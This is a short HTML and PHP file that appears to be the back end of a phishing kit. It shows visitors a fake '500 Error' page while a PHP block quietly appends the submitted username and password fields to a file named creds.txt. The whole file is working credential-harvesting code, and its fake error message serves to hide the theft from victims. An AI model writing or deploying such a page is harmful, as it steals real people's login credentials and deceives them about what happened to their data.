<!DOCTYPE html>
<html>
<head>
        <title>Error</title>
</head>
<body>
        <h1>500 Error - Website is Temporarily Unavailable</h1>
        <h5>We are sorry, there was a problem showing this page. We experienced some technical difficulties in retrieving the content.</h5>
        <h5>Please try again later</h5>
</body>

</html>

<?php

        if(isset($_POST['usrnm']) && isset($_POST['psw'])){

                $creds_file = fopen("creds.txt", "a") or die("Unable to open file!");

                $username = "Username : ". $_POST['usrnm'];
                $password = " / Password : ". $_POST['psw']."\n";

                fwrite($creds_file, $username);
                fwrite($creds_file, $password);

                fwrite($creds_file, $line);

                fclose($creds_file);
        }
?>
